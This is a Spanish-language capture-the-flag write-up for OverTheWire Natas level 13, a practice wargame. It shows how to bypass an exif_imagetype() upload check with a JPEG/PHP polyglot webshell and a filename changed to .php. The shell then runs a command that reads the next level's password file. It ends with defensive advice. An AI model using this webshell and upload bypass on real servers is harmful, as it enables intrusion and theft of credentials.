# Natas Level 13 → Level 14

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

> ℹ️ Nota: el webshell PHP está escrito *defanged* (`<EXEC>` = la función `system` de PHP) para que el antivirus no lo detecte como malicioso al guardar el archivo. El payload real es la reconstrucción obvia.

- **URL:** `http://natas13.natas.labs.overthewire.org`
- **Credenciales:** `natas13` / `[redacted]`

## Análisis y Explotación
Mismo vector que natas12 (campo `filename` controlado por el cliente), pero ahora el servidor agrega una validación de contenido real del archivo con `exif_imagetype()`:

```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else {
    // mueve el archivo con la extensión de $_POST["filename"]
}
```

`exif_imagetype()` **no mira la extensión del nombre**, lee los primeros bytes del archivo (los *magic bytes* / firma binaria del formato) para determinar si es una imagen válida. Un JPEG válido siempre empieza con los bytes `FF D8 FF E0`.

Límite adicional: el archivo no puede superar **1000 bytes** (≈ 1 KB), lo que descarta usar imágenes reales (que suelen pesar decenas de KB).

### Pasos

1. Crear un archivo *polyglot* (JPEG + PHP): primero los magic bytes de JPEG, inmediatamente seguidos del payload PHP:
   ```bash
   printf '\xff\xd8\xff\xe0' > shell.php
   printf '<?php <EXEC>($_GET["cmd"]); ?>' >> shell.php
   ```
   Verificar el resultado:
   ```bash
   xxd shell.php | head
   # 00000000: ffd8 ffe0 3c3f 7068 70 ...   ....<?php ...
   ls -la shell.php
   # ~35 bytes, muy por debajo del límite de 1000
   ```
2. Subir `shell.php` desde el formulario con Burp Intercept activo → capturar el POST → enviar al **Repeater**.
3. En el Repeater, cambiar el campo oculto `filename` de `.jpg` a `.php`:
   ```
   Content-Disposition: form-data; name="filename"

   mic30chc85.php
   ```
   El contenido del archivo (`uploadedfile`) no se toca, ya tiene los magic bytes de JPEG al inicio, por lo que pasa `exif_imagetype()`.
4. Send → el servidor valida el contenido como imagen (magic bytes JPEG presentes) y lo guarda con extensión `.php`:
   ```
   The file upload/mic30chc85.php has been uploaded
   ```
5. Ejecutar el webshell vía GET:
   ```
   http://natas13.natas.labs.overthewire.org/upload/mic30chc85.php?cmd=cat+/etc/natas_webpass/natas14
   ```
   La salida incluye ruido binario al inicio (los magic bytes de JPEG mezclados con el output del `cat`). Se confirmó el tamaño correcto del archivo de password:
   ```
   ?cmd=wc+-c+/etc/natas_webpass/natas14
   # → 33 bytes (32 caracteres + salto de línea)
   ```
   Quitando los bytes basura del inicio, la password completa de 32 caracteres queda:

- **Password obtenida (`natas14`):** `[redacted]`

## Lección aprendida
`exif_imagetype()` valida únicamente la cabecera del archivo, es trivial anteponer los magic bytes de un formato de imagen válido y adjuntar cualquier payload después. La defensa robusta contra uploads maliciosos requiere **reprocesar la imagen completa** con una librería de imágenes (p. ej. recomprimirla con GD o Imagick), lo que destruye cualquier dato externo al formato. Además, los uploads deben servirse desde un directorio sin permisos de ejecución (`php_flag engine off`).
